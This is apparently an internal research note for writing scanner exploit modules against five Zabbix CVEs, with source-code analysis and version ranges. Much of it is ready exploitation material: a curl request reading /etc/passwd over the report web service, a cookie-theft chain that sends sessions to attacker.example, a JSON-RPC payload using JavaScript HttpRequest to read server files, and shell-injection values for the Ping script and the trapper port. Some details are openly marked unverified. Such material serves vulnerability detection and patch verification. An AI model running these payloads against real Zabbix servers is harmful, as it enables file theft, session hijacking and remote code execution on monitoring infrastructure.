# Deep technical protocols: Zabbix vulnerability vectors (2016–2026)

Research note for writing exploit modules for the scanner.
All data is from primary sources (source code of the zabbix repository at GitHub tags, Jira ZBX-*, Zabbix advisories, NVD/CVE.org). Anything not directly confirmed is marked `[INFERENCE]`/`[UNVERIFIED]`.

Publication-date data for: CVE-2022-46768, CVE-2023-32725, CVE-2023-29450, CVE-2024-22116, CVE-2020-11800.

---

## CVE-2022-46768 (ZBX-22087) — Arbitrary file read via Zabbix Web Service Report Generation

- Ticket/primary source: https://support.zabbix.com/browse/ZBX-22087 (ZBV-2022-09-1); fix commits: 6.0.12rc1 `fdb03971867`, 6.2.6rc1 `58a857adbfc`, 6.4.0rc1 `1d92fad6541` (git.zabbix.com).
- Vector: **unauthenticated HTTP(S) POST to port 10053** (zabbix_web_service), endpoint `/report`, Content-Type `application/json`. The service, running headless Chrome (chromedp), navigates to the URL from a JSON field and returns a PDF render of the page. In vulnerable versions **the URL scheme is not validated at all** → `file://` allows reading an arbitrary local file from the web service machine (Chrome renders the file contents into the PDF response).

### Exact protocol (verified against sources)

Vulnerable code: `src/go/cmd/zabbix_web_service/pdf_report_creator.go` (branches ≤6.0.11, 6.2.0–6.2.5; similar in 6.2/6.4). Verified on tag **6.0.11** (GitHub):

```go
type requestBody struct {
    URL        string            `json:"url"`
    Header     map[string]string `json:"headers"`
    Parameters map[string]string `json:"parameters"`
}
...
u, err := parseUrl(req.URL)      // only checked: not empty and has a scheme
...
chromedp.Run(ctx, chromedp.Tasks{
    network.SetExtraHTTPHeaders(... "Cookie": req.Header["Cookie"]),
    emulation.SetDeviceMetricsOverride(width, height, 1, false),
    navigateAndWaitFor(u.String(), "networkIdle"),  // page.Navigate(URL) + wait networkIdle
    ... page.PrintToPDF() ...
})
// response: Content-Type: application/pdf, body = PDF
```

Request (exactly as zabbix_server constructs it, `src/zabbix_server/reporter/report_writer.c` → `rw_get_report()`):

```http
POST /report HTTP/1.1
Host: <zabbix-web-service>:10053
Content-Type: application/json

{"url":"file:///etc/passwd","headers":{"Cookie":"zbx_session=anything"},"parameters":{"width":"800","height":"600"}}
```

- `width`/`height` are mandatory: parsed via `strconv.ParseInt(..., 10, 64)` → on absence/non-numeric value a 400 `{"detail":"Incorrect parameter width: ..."}` is returned.
- `headers` is optional (used as the Cookie header for headless Chrome).
- Response on success: `200`, `Content-Type: application/pdf`, body — a PDF with the rendered contents of `/etc/passwd` (Chrome renders text files as plain text). Useful reads: `/etc/passwd`, `/etc/shadow` (if the user can read it), Zabbix configs (`/etc/zabbix/zabbix_server.conf` — contains DBPassword, albeit with restricted permissions), keys, `/proc/self/environ`, etc.
- Errors: 400 `application/problem+json` `{"detail":"..."}`; 500 on Chrome errors; 405 if the method is not POST; 401/500 if RemoteAddr is not in AllowedIP.

### Conditions / limitations

1. **AllowedIP**: in `zabbix_web_service.conf` the `AllowedIP` option (config `src/go/cmd/zabbix_web_service/config.go`: `ListenPort` default `10053`, `AllowedIP` optional, `Timeout` default 3s, range 1–30). `zbxnet.GetAllowedPeers("")` → empty list → **all connections are rejected** (`CheckPeer` returns false). Default in the Docker image `zabbix/zabbix-web-service:6.0.27-alpine`: `ZBX_ALLOWEDIP="zabbix-server"` (the server container's hostname, docker-entrypoint.sh), i.e. by default the network is limited to the server container. Actually exploitable when: port 10053 is published and AllowedIP is broadened (e.g. to a docker subnet / `0.0.0.0/0` / a name resolving to an accessible address), or the attacker already has access from an allowed address. Advisory ZBX-22087: precondition — "web service has to allow the access from attacker's IP".
2. Headless Chrome must be installed on the web service host (in the official image — the `chromium` package, run with `--no-sandbox` via the image patch `chromedp_no_sandbox.patch`, which adds `chromedp.NoSandbox`, `disable-setuid-sandbox`).
3. Vulnerable versions: **< 6.0.12, 6.2.0–6.2.5, < 6.4.0beta5** (per Jira; Snyk: [6.0.0,6.0.12rc1), [6.2.0,6.2.6rc1)). 6.0.12 and above — requests with a non-http(s) scheme, path ≠ `.../zabbix.php`, or `action != dashboard.print` get 400 `Unexpected URL scheme/path/action`.

### Fix (what the detector module checks on patched versions)

Added in 6.0.12rc1 (diff 6.0.11→6.0.27):

```go
if u.Scheme != "http" && u.Scheme != "https" { ... "Unexpected URL scheme" ... 400 }
if !strings.HasSuffix(u.Path, "/zabbix.php") { ... "Unexpected URL path" ... }
if queryParams.Get("action") != "dashboard.print" { ... "Unexpected URL action" ... }
```

### POC

null (no public PoCs found; the protocol was fully reconstructed from the sources + the patch diff). Verification payload for the scanner:

```bash
curl -s -H 'Content-Type: application/json' \
  -d '{"url":"file:///etc/passwd","headers":{},"parameters":{"width":"800","height":"600"}}' \
  http://<TARGET>:10053/report | head -c 200   # expected "%PDF" (success) or 400 with "Unexpected URL scheme"/"Incorrect request url"
```

- 200 + `%PDF` → vulnerable (the file was read).
- 400 `Unexpected URL scheme` / `Unexpected URL path` / `Unexpected URL action` → patched.
- 500 `detail: Cannot accept incoming connection for peer` → AllowedIP blocks it (not directly exploitable).
- `Incorrect request url: ...` on `file://` also means patched (was the scheme checked in parseUrl? no — in 6.0.11 parseUrl only requires a scheme; in the patch the scheme error comes from a separate check).

- Ambiguities: the exact response to `file://` when Chrome is absent (e.g. Alpine without chromium) — no PDF will be generated, a 500 `Cannot fetch data ...` will be returned; this does not affect detection. 6.2/6.4.0 had identical implementations [INFERENCE from the fix pattern — not checked line by line].

---

## CVE-2023-32725 (ZBX-23854) — Leak zbx_session cookie via the URL widget in a scheduled report

- Ticket/primary source: https://support.zabbix.com/browse/ZBX-23854 (CVE-2023-32725, CVSS 9.6, CWE-565/CAPEC-593/233). Fix commits (web service + server): 6.0.22rc1 `89e0cd6ea93`, 6.4.7rc1 `3f22d7dd372`, 7.0.0alpha5 `4428a58a30f`.
- Affected: **6.0.0–6.0.21, 6.4.0–6.4.6, 7.0.0alpha1–alpha3**; fix 6.0.22rc1 / 6.4.7rc1 / 7.0.0alpha4.
- Vector: session hijacking (harvesting someone else's `zbx_session` cookie) via the URL widget inside a dashboard during scheduled report generation/testing.

### Mechanics (verified against the web service code)

1. The report (PDF) is generated by the web service: the server sends POST `/report` with `{"url":"http://<frontend>/zabbix.php?action=dashboard.print&dashboardid=...","headers":{"Cookie":"zbx_session=<session>"},"parameters":{w,h}}` → headless Chrome loads the user's dashboard, does PrintToPDF, returns the PDF.
2. A dashboard may contain a **URL widget** (iframe) whose URL is set by a user with dashboard editing rights.
3. Vulnerability: in the web service before the fix the cookie was passed as a **global HTTP header on ALL browser requests**:

   `network.SetExtraHTTPHeaders(network.Headers(map[string]interface{}{"Cookie": req.Header["Cookie"]}))` — verified on tag **6.0.21** (line 163 of pdf_report_creator.go).

   → the iframe (URL widget) request to any external domain goes out with the header `Cookie: zbx_session=<session>`.
4. Fix (6.0.22rc1): instead of raw SetExtraHTTPHeaders — `network.SetCookies()` with parameters `{Name, Value, URL: req.URL, Domain: u.Hostname(), SameSite: Strict, HTTPOnly: true}` — the cookie is now bound to the dashboard host (zabbix frontend) and is not sent to foreign domains (iframes). Verified on tag 6.0.27.

### Exploitation scenario (exact steps)

Prerequisites:
- Zabbix has a user whose role grants: dashboard editing (creating/modifying a URL widget) + running/testing scheduled reports (permissions `UI: Reports → Scheduled reports` / `Actions: Manage scheduled reports` — per Jira "scheduled reports are available to Admin and Super admin user types"; in 6.0 also any role-based access). The attacker is either such a user themselves or tricks the victim (UI:R; phishing/CSRF unlikely — UI login is required).
- The Zabbix web service is running and reachable (mandatory, since the report is rendered by it).

Steps:
1. The attacker obtains/uses user rights (Admin/Super admin) and creates a dashboard with a URL widget: `https://attacker.example/capture?rid=<random>` (or adds such a widget to an existing dashboard accessible to the user).
2. Creates a scheduled report for that dashboard (Reports → Scheduled reports → Create report), any period.
3. Trigger:
   - **Test**: the "Test" button in the report form (frontend `CControllerPopupScheduledReportTest` → `CZabbixServer->testReport()` → the server starts generation via the web service). — the fastest way.
   - Or wait for the **automatic execution** of the report on schedule.
4. The web service renders the dashboard; the URL widget iframe → GET `https://attacker.example/capture?...` with the header `Cookie: zbx_session=<report creator's session>`.
5. Attacker.example logs the Cookie → the attacker injects `zbx_session` into their own browser/API client → full frontend access with the victim's rights (session hijack).

API equivalents for automation (6.0.x):
- Dashboard creation/editing: `POST /api_jsonrpc.php` `method: dashboard.create` / `dashboard.update`, widget `type: "url"`, field `url` = the external URL. Dashboard permissions are required.
- Report testing via the API: no direct method [UNVERIFIED — in 6.0 testing is UI-only]; automatic execution — on schedule (the server's report-manager cron).
- For the scanner: detection = version in the affected range **AND** the web service responds on `/report` (i.e. the report function is enabled). A full functional test (create dashboard+widget+report) requires a full-fledged Admin account.

### Details for version detection (web service part)

An indirect sign of patching: the web service on tag ≥6.0.22 responds 400 `Unexpected URL path/action` for a `url` without `.../zabbix.php` — but that is a sign of the CVE-2022-46768 fix, not 32725. A reliable sign of CVE-2023-32725 is only the web service binary/package version [INFERENCE]. The 32725 fix also includes a server part (commit 89e0cd6ea93; whether the server changed its protocol was not verified; likely cookie restriction/isolation at the server level [INFERENCE]).

- Ambiguities:
  - The exact changes of the server component (89e0cd6ea93) were not verified (git.zabbix.com is closed for anonymous diffs) — [INFERENCE from the Jira description: Server + Web service components].
  - A URL widget present in a dashboard owned by the victim: the scenario assumes victim participation with Admin/Super admin rights. CVSS 9.6 with UI:R accounts for this.

### POC

null (no public PoC; per the Known attack vectors data in Jira).

---

## CVE-2023-29450 (ZBX-22588) — Unauthorized file system access via JavaScript preprocessing

- Ticket/primary source: https://support.zabbix.com/browse/ZBX-22588 (ZBV-2023-07-27-2, advisory https://www.zabbix.com/security_advisories#ZBV-2023-07-27-2). Fix commits: pre-5.0.32rc1 `c3f1543e4b2`+`ea514f12340`, pre-6.0.14rc2 `76f6a80cb3d`+`5493152e73d`, pre-6.2.8rc2 `3fe0ec46523`+`5213cc393a7`, pre-6.4.0rc3 `c34f799cbb8`+`a28a57af21b`, master `a28a57af21b`.
- Affected: see the 'Version check' section below. By 6.0 code: **6.0.0–6.0.13** (6.0.14+ contains the protocol fix); by the Jira header (security releases): 5.0.x<5.0.34, 6.0.x<6.0.16, 6.2.x<6.2.9, 6.4.x<6.4.2, 7.0.0alpha1.
- Vector: the JavaScript engine (duktape) on the server/proxy executes the JS code of a preprocessing step; the JS API includes the **`HttpRequest`** object, which in vulnerable versions **does not restrict libcurl protocols** → `file://` (and any other schemes — ftp, gopher, ldap, scp/sftp if the modules are present) reads the local file system **as the `zabbix` user** on the Zabbix Server or Proxy.

### Mechanics (verified against the code, 6.0.13 vs 6.0.16)

Vulnerable code `src/libs/zbxembed/httprequest.c` (tag 6.0.13, line ~291): in `es_httprequest_query()` after `CURLOPT_URL` there is **no** `CURLOPT_PROTOCOLS` → libcurl uses its default: ALL protocols are allowed, including `file`.

Fix (tag 6.0.16, lines 359–360):

```c
/* CURLOPT_PROTOCOLS is supported starting with version 7.19.4 */
ZBX_CURL_SETOPT(ctx, request->handle, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS, err);
```

(fix regressions — ZBX-23980 "rtsp", ZBX-23982 "ftp" in Web Monitoring — confirm that the protocol restriction was applied in common code.)

### How to run (exact technical scenario)

Exploitation prerequisite: an authenticated user with **host configuration rights** (Read-write on a host group; that is enough to create/edit items — there is no separate "add items" permission in the classic 5.x–6.4 model). The `User` role with host group permissions fits. Does **not require** the Admin role.

1. Get the `hostid` of a host you have write rights on: `POST /api_jsonrpc.php` `{"method":"host.get","params":{"output":["hostid","name"],"editable":true}}` (with an auth token; the host will be returned to a user with read-write rights).
2. Create an item with a JavaScript preprocessing step that reads a file (constants verified against 6.0.27: the JS step type **21** = `ZBX_PREPROC_SCRIPT` (`ui/include/defines.inc.php`; the UI label 'JavaScript' in `ui/include/items.inc.php`), the item type 'Zabbix internal' **5** = `ITEM_TYPE_INTERNAL`):

```json
{
  "jsonrpc": "2.0", "method": "item.create",
  "params": {
    "name": "js_read",
    "key_": "zabbix[boottime]",
    "hostid": "<hostid>",
    "type": 5,
    "value_type": 0,
    "delay": "30s",
    "preprocessing": [
      {
        "type": 21,
        "params": "var r = new HttpRequest();\nreturn r.get('file:///etc/passwd');"
      }
    ]
  },
  "auth": "<token>", "id": 1
}
```

   - `HttpRequest` is a global constructor of the JS engine, registered in **any** ES environment (`zbx_es_init_env` → `zbx_es_init_httprequest`, embed.c), including the server/proxy preprocessing workers. `r.get(url)` returns the response body as a string (`es_httprequest_query` → `duk_push_lstring`).
   - The item type **5 (internal)** with key `zabbix[boottime]` (a server statistics key, `src/libs/zbxserver/zabbix_stats.c`): the server generates the value itself on schedule → **JS preprocessing will run automatically with no external data source** (neither an agent nor trapper is needed). The simplest trigger.
   - Or a trapper item (`type`: 2) and sending the value: `zabbix_sender -z <SERVER> -p 10051 -s <hostname> -k zabbix[boottime] -o 1` — trapper data is accepted on 10051 without authentication; the server's preprocessing worker will then execute the JS.
3. Wait for the first collection (delay) or the trapper value submission.
4. Read the result (the file contents are in lastvalue): `POST /api_jsonrpc.php` `{"method":"item.get","params":{"itemids":["<itemid>"],"output":["itemid","lastvalue","lastclock"]},"auth":"...","id":2}` → `result[0].lastvalue` contains the contents of `/etc/passwd`.
   - Alternative (a regular user without an API client): UI → Latest data → item → the latest value.

Note: JS in preprocessing is executed by the server process as the OS user under which zabbix_server/zabbix_proxy runs (usually `zabbix`) — read-only access to files readable by that user (typically: /etc/passwd, zabbix configs in /etc/zabbix — often 644, DB files usually not, /proc partially). "Unauthorized": escalation from host group rights to reading the server's file system. Webhook/global script JS also use `HttpRequest` — the same primitive; the CVE is tied to preprocessing as the lowest-barrier place.

### Version check for the scanner (important: code vs Jira header)

**Code-confirmed fact (6.0):** the `CURLOPT_PROTOCOLS = HTTP|HTTPS` restriction in `src/libs/zbxembed/httprequest.c` is present already in **6.0.14** (verified: 6.0.13 — no, 6.0.14/6.0.15/6.0.16 — yes). I.e. in fact **6.0.0–6.0.13** are vulnerable, 6.0.14+ is patched.
- The Jira header's Fix Version says 6.0.16rc1 (the security release the announcement was tied to), while the comment says 'pre-6.0.14rc2' commits. For the detector use the actual code boundary: **< 6.0.14**.
- By analogy (the comment in ZBX-22588, 'pre-5.0.32rc1 / pre-6.2.8rc2 / pre-6.4.0rc3 / pre-7.0.0alpha1'), the actual fix in branches 5.0/6.2/6.4/7.0 should be in **5.0.32 / 6.2.8 / 6.4.0 / 7.0.0alpha1** [INFERENCE — tags of these versions are absent on the GitHub mirror; verify against the target version: the presence of `CURLOPT_PROTOCOLS` in the `src/libs/zbxembed/httprequest.c` sources]. The Jira header (independently): 5.0.34rc1 / 6.2.9rc2 / 6.4.2rc1 / 7.0.0alpha1.
- Summary for version detection (conservative): 5.0.0–5.0.31, 6.0.0–6.0.13, 6.2.0–6.2.7, 6.4.0–6.4.1 are vulnerable; 5.0.32+/6.0.14+/6.2.8+/6.4.0+ are patched (per the fix comment; for 6.2/6.4 — [INFERENCE]).
- For 5.0: the preprocessing JS step type constant in 5.0 may differ from 21 — check `ui/include/defines.inc.php` of the target version before writing the module [INFERENCE].

### POC

null (no public PoCs found; there is a HackerOne report mentioned in the announcement [UNVERIFIED]). The mechanics are confirmed by the sources diff.

### Ambiguities

- The exact `ZBX_PREPROC_JS`/`type` constants in 5.0/6.2/6.4 — by analogy with 6.0 [INFERENCE]; check `ui/include/defines.inc.php` of the target version.
- The JS preprocessing attack requires that the JS engine be built into the server (all official builds do).
- `HttpRequest` in 6.0.13 is a global constructor (registered via `zbx_es_init_httprequest`, names `HttpRequest` and `CurlHttpRequest`; methods get/post/put/patch/delete/customRequest/addHeader etc.).

---

## CVE-2024-22116 (ZBX-25016) — RCE via Ping script parameters (restricted admin)

- Ticket/primary source: https://support.zabbix.com/browse/ZBX-25016 (CVE-2024-22116, CVSS 9.9, PR:L; HackerOne: justonezero / qusaialhaddad). Fix: 6.4.16rc1, 7.0.0rc3.
- Affected: **6.4.9–6.4.15 (fix 6.4.16rc1), 7.0.0alpha1–7.0.0rc2 (fix 7.0.0rc3)**. 6.0/5.0/… are not affected (per Affected versions in Jira).
- Vector: **command injection via the `{HOST.CONN}` macro (a script parameter) when the global "Ping" script is executed from the server**; the role is a "restricted administrator" (restricted admin: has rights to execute scripts in Monitoring → Hosts and to host configuration, but is not a full Super admin). The command `ping -c 3 {HOST.CONN}; case $? in [01]) true;; *) false;; esac` is executed **on the Zabbix Server** (`execute_on` = server) in a shell; the `{HOST.CONN}` value is substituted **without escaping** (lack of default escaping for script parameters).

### Details (verified / partially verified)

- The default Ping script in 7.0.0 (`create/src/data.tmpl`, line `TABLE |scripts`):
  `Ping | ping -c 3 {HOST.CONN}; case $? in [01]) true;; *) false;; esac | host_access=2 | type=0 | execute_on=2 (server) | timeout=30s | usrgrpid=NULL | groupid=NULL`
  (similarly Traceroute: `/usr/bin/traceroute {HOST.CONN}`; Detect operating system: `sudo /usr/bin/nmap -O {HOST.CONN}` — usrgrpid=7 Guests? — to verify).
- Execution: `src/libs/zbxscripts/scripts.c` → `zbx_script_execute()` → for `ZBX_SCRIPT_EXECUTE_ON_SERVER` → `zbx_execute(script->command, ...)` (the `/bin/sh -c` wrapper). `{HOST.CONN}` is resolved to the host's DNS/interface before the call.
- How a "restricted admin" gets input into `{HOST.CONN}`: **via host configuration** — the interface/DNS field (or Host name?) of a host they have write rights on. `{HOST.CONN}` = the host's DNS name, otherwise the interface IP. A malicious value with shell metacharacters (`;`, `|`, `$()`, backticks) gets into the command without escaping → RCE on the server as the `zabbix` user.
- Trigger: Monitoring → Hosts → (select host) → "Execute" (the script icon) → Ping; or API: `POST /api_jsonrpc.php {"method":"script.execute","params":{"scriptid":<id Ping>,"hostid":<hostid>}}` (rights needed: access to the script — Ping host_access=2 = Read-write on the host group — and the right to execute `{HOST.CONN}`). In 6.4/7.0 `script.execute` via the frontend passes `manualinput`, but Ping has no manualinput parameters — the only input value is `{HOST.CONN}`.
- Why this is "PR:L" and "by default": the default role-model permissions: the Admin role has "Scripts → Execute scripts" and host configuration, but NOT "Super admin"; plus the very fact that escaping is absent by default in the macro substitution into the command — anyone with write rights on a host and script execution rights gets RCE.

### Fix

There are no official patch details (git.zabbix.com is closed; the diff between 7.0.0rc2 and 7.0.0rc3 in `src/libs/zbxscripts`, `src/zabbix_server/*scripts*`, `ui/include/classes/api` contains no escaping-related changes — conclusion: the change is in other files: **in C code 7.0.0rc3 differs from rc2 only in `src/zabbix_server/server.c` (SMSDevices)** and 3 PHP files (CHistory sort, CItemHelper, CSystemInfoHelper) — none are about escaping) [UNVERIFIED — the fix is probably in macro substitution before exec or in the validation of `{HOST.CONN}` at script creation/execution time; the closest candidate is `src/libs/zbxcommon/zbxmacro.c` / a `zbx_str_replace` chain or an added escaping mode for script commands].

  The fix mechanism (per the Jira wording "lack of default escaping for script parameters") — escaping of script parameter values was added by default [INFERENCE].

### Verification steps for the scanner/module

1. Version in the range 6.4.9–6.4.15 or 7.0.0alpha1–7.0.0rc2.
2. An account exists with: write rights on a host (or the create host permission) + access to the Ping script (by default host_access=2 → requires read-write rights on the same group) + the execute scripts permission in the role.
3. Create/modify a host so that DNS (or the interface) = `127.0.0.1;touch /tmp/zab_pwn_<rand>` (in the UI Host → DNS name; API `host.update`/`host.create` with `interfaces[].dns`).
4. Execute: `script.execute {scriptid: <id Ping>, hostid: <hostid>}` (or UI Execute → Ping).
5. RCE check: `;touch /tmp/...` on the server; the script result will come back in `result.value` (it will contain the ping output + code).
   - Nuance: some roles grant execute without write rights on the host — then input into `{HOST.CONN}` is impossible; minimally, write rights on the host are needed [INFERENCE from the macro mechanics].

### POC

null (the HackerOne report is private). [UNVERIFIED: injection specifically via the DNS field has not been confirmed by third-party analysis; but the {HOST.CONN}→shell mechanics without escaping is confirmed by the `zbx_execute`/`zbx_script_execute` code]

- Ambiguities: where exactly the fix was introduced (which file/mechanism) — not confirmed; 'parameters' in the CVE title may also mean the scripts' manualinput parameters (JSON `manualinput`), not only {HOST.CONN} [UNVERIFIED]. For the module it is safer to check both injection paths.

---

## CVE-2020-11800 (ZBX-17600) — RCE on old versions (trapper command + auto-registration injection)

- Ticket/primary source: https://support.zabbix.com/browse/ZBX-17600 (reporter FU CHUANG; fix pre-3.0.31rc1 commit `ee39411033`). Vulhub environment: https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2020-11800 (the README references the write-up https://xz.aliyun.com/t/8991).
- Affected (from the ticket): **Zabbix 3.2 (EOL, never fixed)**, **Zabbix 3.0 up to 3.0.30 inclusive (fix 3.0.31)**, **Zabbix 2.2.x after 2.2.18 (EOL, never fixed)**. Not affected: 3.4, 4.0, 5.0. RCE is possible **only on the server** (not the agent) — Andris Mednis's comment in the ticket.

### Mechanics (vulhub PoC + the xz.aliyun.com/t/8991 analysis)

Command injection when executing the **Ping script on the server** via the **trapper port 10051**, bypassing the incomplete CVE-2017-2824 patch:

1. **Auto-registration**: the attacker sends a request like this to port 10051 (active agent + a custom `ip` field):

   ```json
   {"request":"active checks","host":"vulhub","ip":"ffff:::;touch /tmp/success2"}
   ```

   The server (with auto-registration enabled) registers a new host; the `ip` value from the request lands in the host-connection value (analogous to `{HOST.CONN}`). The filter from the CVE-2017-2824 patch considers `ffff:::...` a valid IPv6-like address and **does not block it** — the `;` and the command get through.

2. **Execution trigger**: a `command` request is sent to port 10051 (the server-side handling of "execute now" / script):

   ```json
   {"request":"command","scriptid":1,"hostid":<number>}
   ```

   `scriptid` 1 = the global "Ping" script (`ping -c 3 {HOST.CONN}; case $? in [01]) true;; *) false;; esac`, `execute_on=server`). The server executes the command on itself: `ping -c 3 ffff:::;touch /tmp/success2` → RCE as the zabbix OS user.

3. The PoC iterates `hostid` 10000–10500 until it gets a response without "failed" (a successful run).

Prerequisites per vulhub: **auto-registration enabled** (an auto-registration action/rule in the configuration). The exact hostid/session verification requirements in 3.0.x for the `command` request — [UNVERIFIED] (in 3.0.x a "command" request on the trapper port apparently did not require a sessionid for scripts executed on the server — otherwise the vulhub PoC would not work; see the xz.aliyun.com/t/8991 write-up for details).

### Note on the "operations vs script API / User role" question

- Exploitation here goes **not via the `script.execute` API** but via the trapper protocol (10051) — i.e. without any frontend authorization. The 'User' role is not required (anonymous).
- A separate related path (in 2.2/3.0): the `script.execute` API with regular-user rights on scripts executed on the server — it existed, but for CVE-2020-11800 the published mechanics are the trapper chain described above [INFERENCE — I did not confirm the script.execute path with a fix diff].
- '2.2.x after 2.2.18' means: the vulnerability/under-patch appeared in 2.2.19+ (after the CVE-2017-2824 patch was released in the 2.2 branch [INFERENCE]).

### Exact ranges (summary, for version detection)

| Branch | Vulnerable | Fix |
|---|---|---|
| 2.2.x | **2.2.19+ (after 2.2.18)** through the end of the branch | none (EOL) |
| 3.0.x | **everything up to 3.0.30 inclusive** | **3.0.31** |
| 3.2.x | **all** | none (EOL) |
| 3.4/4.0/5.0+ | none | — |

### POC

- https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2020-11800 (exploit.py, port 10051, payload `ffff:::;touch /tmp/success2`, a Docker environment with Zabbix 3.0.3).
- https://github.com/ycseo-git/CVE-2020-11800 (the same mechanism).

### Ambiguities

- The `command` request check: the exact form of authorization/session for `scriptid`/`hostid` in 3.0.x — not confirmed (could not obtain the 3.0.30/3.0.31 sources: cdn.zabbix.com 404, kernel.org none, Debian snapshot has no 3.x, EPEL7 SRPM not found, Wayback did not archive; git.zabbix.com requires a login). A functional module requires a 3.0.30 test environment (vulhub) — the vector will be verified empirically.

---

## Verifiability summary for modules

| CVE | Vectorization confirmed | Versions (vulnerable) | Versions (fix, actual per code) | Authentication required |
|---|---|---|---|---|
| 2022-46768 | Yes (web service code 6.0.11/6.0.27) | <6.0.12; 6.2.0–6.2.5; <6.4.0beta5 | 6.0.12rc1/6.2.6rc1/6.4.0beta5 | No (only network access to 10053 + AllowedIP) |
| 2023-32725 | Yes (web service code 6.0.21/6.0.27 + Jira CVE Description) | 6.0.0–6.0.21; 6.4.0–6.4.6; 7.0.0alpha1–alpha3 | 6.0.22rc1/6.4.7rc1/7.0.0alpha4 | Yes (Admin / dashboard+report rights) |
| 2023-29450 | Yes (httprequest.c code 6.0.13 vs 6.0.14) | 5.0.0–5.0.31 [INF]; 6.0.0–6.0.13; 6.2.0–6.2.7 [INF]; 6.4.0–6.4.1 [INF] | 5.0.32 [INF] / 6.0.14 / 6.2.8 [INF] / 6.4.0 [INF] (Jira header: 5.0.34/6.0.16/6.2.9/6.4.2) | Yes (host write rights) |
| 2024-22116 | Partially (the command/exec were obtained from 7.0.0 code; the fix location was not found) | 6.4.9–6.4.15; 7.0.0alpha1–7.0.0rc2 | 6.4.16rc1/7.0.0rc3 | Yes (restricted admin + host write) |
| 2020-11800 | Mechanics — yes (vulhub PoC / the xz.aliyun.com write-up); the 3.0.31 fix code was not verified (EOL-branch sources unavailable) | 2.2.19+–2.2.x; 3.0.0–3.0.30; 3.2.x | only 3.0.31 | No (trapper port 10051, auto-registration must be enabled) |
